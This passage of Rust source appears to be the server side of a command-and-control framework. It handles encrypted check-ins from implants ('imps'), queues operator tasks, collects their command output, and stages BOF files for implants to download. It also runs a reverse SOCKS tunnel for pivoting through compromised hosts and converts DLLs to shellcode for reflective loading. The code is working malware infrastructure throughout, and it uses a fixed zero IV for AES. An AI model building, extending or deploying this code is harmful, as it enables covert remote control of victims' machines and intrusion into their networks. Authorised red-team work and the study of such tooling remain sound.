                    let encrypted_output_data = body;

                    // Load the AES key from the environment variable
                    let encoded_aes_key = env::var("AES_KEY").expect("AES_KEY not set");

                    // Define the custom base64 engine
                    const CUSTOM_ENGINE: engine::GeneralPurpose = engine::GeneralPurpose::new(
                        &alphabet::URL_SAFE,
                        engine::general_purpose::NO_PAD,
                    );

                    // Decode the AES key using the custom base64 engine
                    let aes_key = match CUSTOM_ENGINE.decode(encoded_aes_key) {
                        Ok(data) => data,
                        Err(e) => {
                            eprintln!("Failed to decode base64: {}", e);
                            return HttpResponse::BadRequest().body("Failed to decode base64");
                        }
                    };

                    // Base64 decode the encrypted data using the custom engine
                    let decoded = match CUSTOM_ENGINE.decode(encrypted_output_data) {
                        Ok(data) => data,
                        Err(e) => {
                            eprintln!("Failed to decode base64: {}", e);
                            return HttpResponse::BadRequest().body("Failed to decode base64");
                        }
                    };

                    // Initialize the AES decryption
                    let cipher = Cipher::aes_256_cbc();
                    let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should match the one used during encryption
                    let mut crypter = Crypter::new(cipher, Mode::Decrypt, &aes_key, Some(&iv))
                        .expect("Failed to create Crypter");

                    // Decrypt the data
                    let mut decrypted_data = vec![0; decoded.len() + cipher.block_size()];
                    let mut count = crypter
                        .update(&decoded, &mut decrypted_data)
                        .expect("Failed to decrypt data");
                    count += crypter
                        .finalize(&mut decrypted_data[count..])
                        .expect("Failed to finalize decryption");

                    // Truncate to the actual size of the decrypted data
                    decrypted_data.truncate(count);

                    // Print debug information
                    println!("IV: {:?}", iv);
                    println!("Decrypted data length: {}", decrypted_data.len());
                    println!("Decrypted data: {:?}", decrypted_data);

                    //convert decrypted data to a string
                    let decrypted_data = match String::from_utf8(decrypted_data) {
                        Ok(decrypted_data) => decrypted_data,
                        Err(_) => {
                            return HttpResponse::BadRequest()
                                .body("Failed to convert decrypted data to string");
                        }
                    };

                    // Deserialize the decrypted data
                    let sleep_time: SleepTime =
                        serde_json::from_str(&decrypted_data).expect("Failed to deserialize data");

                    //let sleep = sleep_time.sleep.clone();
                
                let sleep_time_result =
                    update_sleep_time(db.clone(), &sleep_time, imp_token.clone())
                        .await;
                match sleep_time_result {
                    Ok(_) => (),
                    _ => {
                        return HttpResponse::InternalServerError()
                            .body("Error in update_sleep_time")
                    }
                }
                // If the token is valid, do something
                //first update the last_check_in column in the imps table. get the current time then update the last_check_in column with that time
                //CODE GOES HERE
                let tasks_result = check_tasks(db, imp_token.clone()).await;
                match tasks_result {
                    Ok(tasks) => HttpResponse::Ok().json(tasks),
                    _ => HttpResponse::InternalServerError().body("Error in check_tasks"),
                }
            } else {
                HttpResponse::Unauthorized().body("Invalid token")
            }
        }
        None => HttpResponse::BadRequest().body("No token found"),
    }
}

//trying to update the issue_task endpoint to verify the client token, then verify the imp token, then insert the task into the tasks table
pub async fn issue_task(req: HttpRequest, db: Data<Arc<Mutex<Connection>>>) -> impl Responder {
    // Grab auth token
    let token = req.headers().get("X-Token");

    // Grab imp_token
    let imp_token = req.headers().get("X-Session");

    // Grab task
    let task = req.headers().get("X-Task");
    //println!("task: {:#?}", task);
    //task_name is correct here, so it must be getting an extra \ when converted to a string, below

    // Verify auth token
    if verify_token(&token.unwrap().to_str().unwrap(), &db).await {
        // Handle imp_token
        match imp_token {
            Some(token) => {
                let imp_token = match token.to_str() {
                    Ok(imp_token) => imp_token.to_owned(),
                    Err(_) => {
                        return HttpResponse::NotFound().finish();
                    }
                };

                // Verify session
                if verify_session(&imp_token, &db).await {
                    // Handle task
                    match task {
                        Some(task) => {
                            //this seems to be where the extra \ is coming in
                            let mut task = match task.to_str() {
                                Ok(task) => task.to_owned(),
                                Err(_) => {
                                    return HttpResponse::BadRequest().body("Failed to read task");
                                }
                            };
                            if task.is_empty() {
                                return HttpResponse::BadRequest().body("Task cannot be empty");
                            }

                            // Unescape backslashes
                            //let unescaped_task = unescape_backslashes(&task);

                            //before we insert the task in the db, check to see if it contains the word socks
                            //if it does, then we will spin up a socks server, by calling a function called socks
                            //either way, we will insert the task into the tasks table

                            //if task contains the word socks, then we will call the socks function
                            if task.contains("socks") {
                                //call the socks function
                                //get the ip from the tasks string and pass it to the socks function

                                let ip =
                                    task.clone().split_whitespace().nth(1).unwrap().to_string();
                                let ip_clone = ip.clone();
                                let port =
                                    task.clone().split_whitespace().nth(2).unwrap().to_string();

                                // Spawn the blocking operation in a separate thread without waiting for it
                                tokio::task::spawn_blocking(move || socks(ip, port));

                                task = task.replace(&format!(" {}", ip_clone), "");
                            }

                            let db = db.lock().unwrap();
                            db.execute(
                                "INSERT INTO tasks (token, task) VALUES (?1, ?2)",
                                params![imp_token, task],
                            )
                            .expect("Failed to insert task");

                            return HttpResponse::Ok().finish();
                        }
                        None => {
                            return HttpResponse::BadRequest().body("No task found");
                        }
                    }
                } else {
                    return HttpResponse::NotFound().finish();
                }
            }
            None => {
                return HttpResponse::BadRequest().body("No session found");
            }
        }
    } else {
        return HttpResponse::Unauthorized().finish();
    }
}
//this function is used to authenticate operators and return a token for them to use to interact with the server
pub async fn authenticate(req: HttpRequest, db: Data<Arc<Mutex<Connection>>>) -> impl Responder {
    // Assume that the username and password are sent in the format "Basic base64(username:password)"
    let req_auth = req.headers().get(header::AUTHORIZATION).cloned();
    match req_auth {
        Some(auth) => {
            let auth = match auth.to_str() {
                Ok(auth) => auth.to_owned(),
                Err(_) => {
                    return HttpResponse::BadRequest().body("Failed to read auth header");
                }
            };
            let auth_parts: Vec<String> = auth.split_whitespace().map(|s| s.to_string()).collect();
            if auth_parts.len() != 2 || &auth_parts[0] != "Basic" {
                return HttpResponse::BadRequest().body("Invalid auth header format");
            }
            let decoded = general_purpose::STANDARD.decode(&auth_parts[1]).unwrap();
            //check for errors

            let decoded_str = match String::from_utf8(decoded) {
                Ok(decoded_str) => decoded_str,
                Err(_) => {
                    return HttpResponse::BadRequest()
                        .body("Decoded auth header is not a valid UTF-8 string");
                }
            };
            //we should sanitize the input here to avoid sqli

            let user_pass: Vec<String> = decoded_str.split(":").map(|s| s.to_string()).collect();
            if user_pass.len() != 2 {
                return HttpResponse::BadRequest().body("Invalid decoded auth header format");
            }
            let (username, plaintext_password) = (user_pass[0].clone(), user_pass[1].clone());
            let db_clone = db.clone();

            let correct_password_hash: SqlResult<String> = task::spawn_blocking(move || {
                let db = db_clone.lock().unwrap();
                let mut stmt = match db.prepare("SELECT password FROM users WHERE username = ?1") {
                    Ok(stmt) => stmt,
                    Err(_) => {
                        return Err(rusqlite::Error::QueryReturnedNoRows);
                    }
                };
                stmt.query_row(params![username], |row| row.get(0))
            })
            .await
            .unwrap_or(Err(rusqlite::Error::QueryReturnedNoRows));

            let correct_password = correct_password_hash.unwrap();

            if verify(&plaintext_password, &correct_password).unwrap_or(false) {
                let token = generate_token(&db.clone());
                HttpResponse::Ok().body(token)
            } else {
                HttpResponse::Unauthorized().body("Failed password verification")
            }
        }
        None => HttpResponse::BadRequest().body("No auth header found"),
    }
}

// This function is used to generate a token for the Imps to use upon successful check-in
// will want to beef this up in the future to make it more secure

use uuid::Uuid;
//this function is used to generate tokens for operators
pub fn generate_token(db: &Arc<Mutex<Connection>>) -> String {
    // Generate a random UUID
    let token = Uuid::new_v4().to_string();

    // Store the token in the database
    let db = db.lock().unwrap();
    db.execute("INSERT INTO tokens (token) VALUES (?1)", params![token])
        .expect("Failed to insert token");

    token
}
//this function is used to verify tokens for operators
pub async fn verify_token(token: &str, db: &Arc<Mutex<Connection>>) -> bool {
    let db = Arc::clone(db);
    let token = token.to_owned();
    let exists: SqlResult<bool> = web::block(move || {
        let db = db.lock().unwrap();
        let mut stmt = match db.prepare("SELECT EXISTS(SELECT 1 FROM tokens WHERE token = ?1)") {
            Ok(stmt) => stmt,
            Err(_) => {
                return Err(rusqlite::Error::QueryReturnedNoRows);
            }
        };
        stmt.query_row(params![token], |row| row.get(0))
    })
    .await
    .unwrap_or(Err(rusqlite::Error::QueryReturnedNoRows));

    match exists {
        Ok(true) => true,
        _ => false,
    }
}
//this function is used to generate tokens for imps
pub fn generate_imp_token(db: &Arc<Mutex<Connection>>) -> String {
    // Generate a random UUID
    let token = Uuid::new_v4().to_string();

    //trim the token to 8 characters
    //let token = &token[..8];
    //don't do this here, it harms security

    // Store the token and session in the database

    let db = db.lock().unwrap();
    db.execute("INSERT INTO imp_tokens (token) VALUES (?1)", params![token])
        .expect("Failed to insert token");

    token.to_owned()
}
//this function generates the intial hardcoded secret UUID in imps at compile time (imp compile time, not server compile time)
pub fn generate_imp_secret(db: &Arc<Mutex<Connection>>) -> String {
    // Generate a random UUID
    let secret = Uuid::new_v4().to_string();

    //trim the token to 8 characters
    //let token = &token[..8];
    //don't do this here, it harms security

    // Store the token and session in the database

    let db = db.lock().unwrap();
    db.execute(
        "INSERT INTO unique_identifiers (id) VALUES (?1)",
        params![secret],
    )
    .expect("Failed to insert secret");

    secret.to_owned()
}

//this function verifies imp session tokens
pub async fn verify_session(session: &str, db: &Arc<Mutex<Connection>>) -> bool {
    let db = Arc::clone(db);
    let session = session.to_owned();
    let exists: SqlResult<bool> = web::block(move || {
        let db = db.lock().unwrap();
        let mut stmt = match db.prepare("SELECT EXISTS(SELECT 1 FROM imp_tokens WHERE token = ?1)")
        {
            Ok(stmt) => stmt,
            Err(_) => {
                return Err(rusqlite::Error::QueryReturnedNoRows);
            }
        };
        stmt.query_row(params![session], |row| row.get(0))
    })
    .await
    .unwrap_or(Err(rusqlite::Error::QueryReturnedNoRows));

    match exists {
        Ok(true) => true,
        _ => false,
    }
}

#[derive(Debug, Deserialize)]
pub struct OutputData {
    session: String,
    task_name: String,
    output: String,
}
//this function is used to return output from imps
pub async fn return_out(
    req: HttpRequest,
    body: String,
    db: Data<Arc<Mutex<Connection>>>,
) -> impl Responder {
    //verify the token from the request header against entries in the imps_token table. simply make sure it exists
    let _imp_token = req.headers().get("X-Session");

    //grab task name so we can remove the completed task from the tasks table upon successfully inserting the task output into the outputs table
    // Collecting task name from header
    /*let task_name = req
        .headers()
        .get("X-Task-Name")
        .and_then(|header_value| header_value.to_str().ok());

    //grab output string
    let imp_output = req.headers().get("X-Output");*/
    // Extract the data from the JSON body
    let encrypted_output_data = body;

    // Load the AES key from the environment variable
    let encoded_aes_key = env::var("AES_KEY").expect("AES_KEY not set");

    // Define the custom base64 engine
    const CUSTOM_ENGINE: engine::GeneralPurpose =
        engine::GeneralPurpose::new(&alphabet::URL_SAFE, engine::general_purpose::NO_PAD);

    // Decode the AES key using the custom base64 engine
    let aes_key = match CUSTOM_ENGINE.decode(encoded_aes_key) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Failed to decode base64: {}", e);
            return HttpResponse::BadRequest().body("Failed to decode base64");
        }
    };

    // Base64 decode the encrypted data using the custom engine
    let decoded = match CUSTOM_ENGINE.decode(encrypted_output_data) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Failed to decode base64: {}", e);
            return HttpResponse::BadRequest().body("Failed to decode base64");
        }
    };

    // Initialize the AES decryption
    let cipher = Cipher::aes_256_cbc();
    let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should match the one used during encryption
    let mut crypter =
        Crypter::new(cipher, Mode::Decrypt, &aes_key, Some(&iv)).expect("Failed to create Crypter");

    // Decrypt the data
    let mut decrypted_data = vec![0; decoded.len() + cipher.block_size()];
    let mut count = crypter
        .update(&decoded, &mut decrypted_data)
        .expect("Failed to decrypt data");
    count += crypter
        .finalize(&mut decrypted_data[count..])
        .expect("Failed to finalize decryption");

    // Truncate to the actual size of the decrypted data
    decrypted_data.truncate(count);

    // Print debug information
    println!("IV: {:?}", iv);
    println!("Decrypted data length: {}", decrypted_data.len());
    println!("Decrypted data: {:?}", decrypted_data);

    //convert decrypted data to a string
    let decrypted_data = match String::from_utf8(decrypted_data) {
        Ok(decrypted_data) => decrypted_data,
        Err(_) => {
            return HttpResponse::BadRequest().body("Failed to convert decrypted data to string");
        }
    };

    // Deserialize the decrypted data
    let output_data: OutputData =
        serde_json::from_str(&decrypted_data).expect("Failed to deserialize data");

    let imp_token = output_data.session;
    let task_name = unescape_backslashes(&output_data.task_name);
    //println!("task name: {}", &task_name);
    let imp_output = output_data.output;

    //let unescaped_task = unescape_backslashes(&task_name);
    //println!("task name escaped: {}", &unescaped_task);

    /*match imp_token {
    Some(imp_token) => {
        let imp_token = match imp_token.to_str() {
            Ok(imp_token) => imp_token.to_owned(),
            Err(_) => {
                return HttpResponse::NotFound().finish();
            }
        };*/

    // Handle task
    // Verify the imp session
    if verify_session(&imp_token, &db).await {
        // If the token is valid, then read the output and add to the database
        if imp_output.is_empty() {
            // Maybe change this? Output can probably be empty
            return HttpResponse::BadRequest().body("Output cannot be empty");
        }

        let db = db.lock().unwrap();
        db.execute(
            "INSERT INTO outputs (token, task, output) VALUES (?1, ?2, ?3)",
            params![imp_token, task_name, imp_output],
        )
        .expect("Failed to insert cmd output");

        /* old delete task code
            // Removing task from database based on both imp_token and task_name matching
            db.execute(
                "DELETE FROM tasks WHERE token = ?1 AND task = ?2",
                params![imp_token, task_name],
            )
            .expect("Failed to delete task");
        */

        // Removing task from database based on both imp_token and task_name matching
        //trying to combine old and new delete operations
        /*
            db.execute(
                "DELETE FROM tasks WHERE token = ?1 AND task LIKE ?2",
                params![
                    imp_token,
                    "%".to_owned() + &task_name.replace("\\", "\\\\") + "%"
                ],
            )
            .expect("Failed to delete task");
        */
        //still missing some stuff so as a workaround we are going to delete all tasks for a token
        /*
            db.execute(
                "DELETE FROM tasks WHERE token = ?1 AND (task = ?2 OR task LIKE ?3)",
                params![
                    imp_token,
                    task_name,
                    "%".to_owned() + &task_name.replace("\\", "\\\\") + "%"
                ],
            )
            .expect("Failed to delete task");
        */

        db.execute("DELETE FROM tasks WHERE token = ?1", params![imp_token])
            .expect("Failed to delete tasks");

        HttpResponse::Ok().finish()
    } else {
        HttpResponse::NotFound().finish()
    }
}
//this function is used by operator clients (conduit) to retrieve output from imps
pub async fn retrieve_out(req: HttpRequest, db: Data<Arc<Mutex<Connection>>>) -> impl Responder {
    let token = req.headers().get("X-Token");
    let imp_token = req.headers().get("X-Session");
    let task_name = req.headers().get("X-Task-Name");

    //println!("task name new debug: {:#?}", task_name);

    if let Some(token) = token {
        if let Ok(token_str) = token.to_str() {
            if verify_token(token_str, &db).await {
                let db = db.lock().unwrap();

                let imp_token_str = imp_token.and_then(|v| v.to_str().ok()).unwrap_or_default();
                let task_name_str = task_name.and_then(|v| v.to_str().ok()).unwrap_or_default();
                //print for debug
                //println!("task_name_string: {}", task_name_str);

                let mut stmt = db
                    .prepare("SELECT output FROM outputs WHERE token = ?1 AND task = ?2")
                    .expect("Failed to prepare query");

                let output_iter = stmt
                    .query_map(params![imp_token_str, task_name_str], |row| {
                        row.get::<_, String>(0)
                    })
                    .expect("Failed to execute query");

                let mut final_output = String::new();
                for output in output_iter {
                    if let Ok(output) = output {
                        final_output = output;
                        //URGENT TODO add something here to remove outputs from the outputs table
                        //print output for debugging
                        //println!("final output: {}", final_output);
                        break; // Assuming you want to return the first output found
                    }
                }

                if !final_output.is_empty() {
                    return HttpResponse::Ok().body(final_output);
                } else {
                    return HttpResponse::NotFound().body("none");
                }
            }
        }
    }

    HttpResponse::BadRequest().finish()
}

// Function to unescape backslashes
fn unescape_backslashes(input: &str) -> String {
    input.replace("\\\\", "\\")
}
//this function retrieves all output from imps, because i had a bug in the retrieve_out function and i dont remember what happened after that
pub async fn retrieve_all_out(
    req: HttpRequest,
    db: Data<Arc<Mutex<Connection>>>,
) -> impl Responder {
    let token = req.headers().get("X-Token");

    const CUSTOM_ENGINE: engine::GeneralPurpose =
        engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);

    if let Some(token) = token {
        if let Ok(token_str) = token.to_str() {
            if verify_token(token_str, &db).await {
                let db = db.lock().unwrap();

                let mut stmt = db
                    .prepare("SELECT id, token, task, output FROM outputs ORDER BY id ASC")
                    .expect("Failed to prepare query");

                let output_iter = stmt
                    .query_map([], |row| {
                        let id: i32 = row.get(0)?;
                        let imp_token: String = row.get(1)?;
                        let task: String = row.get(2)?;
                        let output: String = row.get(3)?;

                        let session_value = imp_token
                            .chars()
                            .rev()
                            .take(8)
                            .collect::<String>()
                            .chars()
                            .rev()
                            .collect::<String>();

                        let final_output = format!("{}: {}: {}", session_value, task, output);

                        Ok((id, final_output))
                    })
                    .expect("Failed to execute query");

                let mut final_output = String::new();
                let mut id_to_delete = None;
                for output in output_iter {
                    if let Ok((id, output)) = output {
                        //base64 encode output
                        let output = CUSTOM_ENGINE.encode(output);
                        final_output = output;
                        //final_output = final_output.replace("\n", "~~~");
                        id_to_delete = Some(id);
                        break; // Assuming you want to return the first output found
                    }
                }

                if let Some(id) = id_to_delete {
                    db.execute("DELETE FROM outputs WHERE id = ?", [id])
                        .expect("Failed to delete row");
                }

                if !final_output.is_empty() {
                    return HttpResponse::Ok().body(final_output);
                } else {
                    return HttpResponse::NotFound().body(CUSTOM_ENGINE.encode("none"));
                }
            }
        }
    }

    HttpResponse::BadRequest().finish()
}

//this is where we will work on adding the API endpoint that accepts chunked data from the conduit client
//use std::collections::HashMap;
use std::fs::File;
use std::io::Write;

// This endpoint is used to receive file uploads from the conduit client
//it was originally used to receive chunked data from the conduit client, but that never made sense for the use case and i never renamed it
pub async fn receive_chunk(
    req: HttpRequest,
    bytes: web::Bytes,
    db: web::Data<Arc<Mutex<Connection>>>,
) -> impl Responder {
    let token = req.headers().get("X-Token");

    //println!("task name new debug: {:#?}", task_name);

    if let Some(token) = token {
        if let Ok(token_str) = token.to_str() {
            if verify_token(token_str, &db).await {
                // Get the filename from the request header
                let filename = req.headers().get("X-Filename");

                // Convert filename to a string
                let filename = match filename {
                    Some(filename) => match filename.to_str() {
                        Ok(filename) => filename.to_owned(),
                        Err(_) => {
                            return HttpResponse::BadRequest().body("Failed to read filename");
                        }
                    },
                    None => {
                        return HttpResponse::BadRequest().body("Failed to read filename");
                    }
                };

                // prepare a path to write the file, which should be a folder called bofs in our current directory
                let path: PathBuf = ["bofs", &filename].iter().collect();

                // Create the bofs directory if it doesn't exist
                use std::fs;

                //doesn't path contain both the dir and filename? checking if that exists is not a good idea since we haven't written the file yet.
                //check for just the dir
                let dir = path.parent().unwrap();
                if !dir.exists() {
                    match fs::create_dir_all(dir) {
                        Ok(_) => {}
                        Err(_) => {
                            return HttpResponse::InternalServerError()
                                .body("Failed to create directory");
                        }
                    }
                }

                // Write the bytes to a file, in the path we prepared earlier

                let mut file = match File::create(&path) {
                    Ok(file) => file,
                    Err(_) => {
                        return HttpResponse::InternalServerError().body("Failed to create file");
                    }
                };

                /*
                // Write the bytes to a file
                let mut file = match File::create(&filename) {
                    Ok(file) => file,
                    Err(_) => {
                        return HttpResponse::InternalServerError().body("Failed to create file");
                    }
                };
                */

                if let Err(_) = file.write_all(&bytes) {
                    return HttpResponse::InternalServerError().body("Failed to write to file");
                }

                HttpResponse::Ok().body("File uploaded successfully")
            } else {
                HttpResponse::Unauthorized().finish()
            } //end of if verify_token
        } else {
            HttpResponse::BadRequest().finish()
        } //end of if let Ok(token_str)
    } else {
        HttpResponse::BadRequest().finish()
    } //end of if let Some(token)
}
//this function is used to download files from the server
pub async fn download_file(
    req: HttpRequest,
    db: Data<Arc<Mutex<Connection>>>,
) -> actix_web::Result<NamedFile> {
    // Get the filename from the request header
    let filename_header = req.headers().get("X-Filename");

    // Verify the token from the request header against entries in the imps_token table. Simply make sure it exists
    let imp_token_header = req.headers().get("X-Session");

    match imp_token_header {
        Some(imp_token_header) => {
            let imp_token = match imp_token_header.to_str() {
                Ok(imp_token) => imp_token,
                Err(_) => return Err(actix_web::error::ErrorNotFound("Token not found")),
            };

            // Verify the token
            if verify_session(imp_token, &db).await {
                // Convert filename to a string
                let filename = match filename_header {
                    Some(filename) => match filename.to_str() {
                        Ok(filename) => filename,
                        Err(_) => {
                            return Err(actix_web::error::ErrorBadRequest(
                                "Failed to read filename",
                            ))
                        }
                    },
                    None => {
                        return Err(actix_web::error::ErrorBadRequest("Filename header missing"))
                    }
                };

                // Create a path to the file
                let path: PathBuf = ["bofs", filename].iter().collect();

                // Serve the file
                NamedFile::open(path).map_err(|_| actix_web::error::ErrorNotFound("File not found"))
            } else {
                Err(actix_web::error::ErrorUnauthorized("Invalid token"))
            }
        }
        None => Err(actix_web::error::ErrorBadRequest("No token found")),
    }
}

//add socks function for spinning up our socks server to listen for connections from the imp
//need to make sure this function does not block the main thread
use std::io::copy;
use std::io::prelude::*;
use std::net::{Shutdown, TcpListener, TcpStream};
use std::sync::{mpsc::channel, mpsc::Receiver, mpsc::Sender};
use std::thread;
use std::time::Duration;
type MyResult<T> = std::result::Result<T, Box<dyn std::error::Error>>;
//this function creates the other end of the socks tunnel for the imp to connect to
//it is currently using a hardcoded port which i intend to give control to the operator in the future
fn socks(ip: String, port: String) {
    // create channels in which to store stream
    let (streams_t, streams_r): (Sender<TcpStream>, Receiver<TcpStream>) = channel();

    // create two listeners, one for socks clients
    /*
        let frontend = env::args().nth(1)
            .expect("first arg not given, usage: <localaddr:port> <externaladdr:port>");
        let backend = env::args().nth(2)
            .expect("second arg not given, usage: <localaddr:port> <externaladdr:port>");
        println!("set socks5 proxy to {} to connect", frontend);
    */
    let frontend = "127.0.0.1:1080";
    //convert frontend to String
    let frontend = frontend.to_string();
    //combine ip and port to create the backend address

    //in the future, add a check here to see if the port is already being used by a previous socks server
    //if it is, then increment the port by 1 and try again
    //TODO
    //might also need to change this to 0.0.0.0 to allow connections from any IP
    //should probably build some auth into this as well
    //yep turns out we dont even need the ip... just the port. I'll clean that up later
    let backend = "0.0.0.0".to_owned() + ":" + &port;
    //convert backend to String
    //let backend = backend.to_string();

    thread::spawn(move || {
        // create the listener for the connection from the connecting
        let listener = TcpListener::bind(backend).unwrap();

        loop {
            match listener.accept() {
                Ok((stream, addr)) => {
                    println!("received reverse proxy connection from : {:?}", addr);
                    if let Err(e) = streams_t.send(stream) {
                        println!("error channeling socket :{:?}", e);
                        continue;
                    }
                }
                _ => (),
            }
        }
    });

    let listener = TcpListener::bind(frontend).unwrap();
    loop {
        match listener.accept() {
            Ok((mut fstream, addr)) => {
                println!("received client connection from: {:?}", addr);

                match streams_r.recv_timeout(Duration::from_millis(1000)) {
                    Ok(mut bstream) => {
                        // validate the socket is still alive before handing it off
                        match validate_stream(&mut bstream) {
                            Ok(_) => {
                                // stream is valid, move copy the fd
                                handle_streams(&mut fstream, &mut bstream);
                            }
                            Err(e) => {
                                // in case there are more in the channel
                                println!("error validating sock:{:?}", e);
                                if let Err(e) = bstream.shutdown(Shutdown::Both) {
                                    println!("error, shutting backend socket: {:?}", e);
                                    continue;
                                }
                            }
                        }
                    }
                    _ => {
                        // no back end stream available, closing socket
                        if let Err(e) = fstream.shutdown(Shutdown::Both) {
                            println!("error, shutting client socket: {:?}", e);
                        }
                    }
                }
            }
            _ => (),
        }
    }
}
//i dont remember what this function does
fn validate_stream(bstream: &mut TcpStream) -> MyResult<()> {
    let mut read_buf = [0u8, 2];
    bstream.read_exact(&mut read_buf)?;
    match &read_buf {
        &[0x22, 0x44] => {
            // 'preflight' check
            Ok(())
        }
        _ => Err(From::from("preflight message received was incorrect")),
    }
}

fn handle_streams(fstream: &mut TcpStream, bstream: &mut TcpStream) {
    // Copy it all
    let mut outbound_in = bstream.try_clone().expect("failed to clone socket");
    let mut outbound_out = bstream.try_clone().expect("failed to clone socket");
    let mut inbound_in = fstream.try_clone().expect("failed to clone socket");
    let mut inbound_out = fstream.try_clone().expect("failed to clone socket");

    // if alive, copy socks together in new threads
    thread::spawn(move || {
        match copy(&mut outbound_in, &mut inbound_out) {
            Ok(_) => {
                // these are GOING to throw errors, so just unwrapping
                outbound_in.shutdown(Shutdown::Read).unwrap_or(());
                inbound_out.shutdown(Shutdown::Write).unwrap_or(());
            }
            Err(_) => {
                println!("failed to perform the copy on sockets.");
            }
        }
    });

    // Upload Thread
    thread::spawn(move || {
        match copy(&mut inbound_in, &mut outbound_out) {
            Ok(_) => {
                // these are GOING to throw errors, so just unwrapping
                inbound_in.shutdown(Shutdown::Read).unwrap_or(());
                outbound_out.shutdown(Shutdown::Write).unwrap_or(());
            }
            Err(_) => {
                println!("failed to perform the copy on sockets..");
            }
        }
    });
}

//add ability to convert dll to shellcode server side
//this function is used to convert dlls to shellcode. its a hacky way of letting the operator specify a shellcode file without
//actually having to write custom shellcode ourselves
pub async fn convert_dll_to_shellcode(path: String) -> Vec<u8> {
    // Convert the DLL to shellcode
    let shellcode = dll2shell::shellcode::shellcode_rdi(&path, "Pick", "".to_string());

    shellcode
}

use openssl::symm::{Cipher, Crypter, Mode};
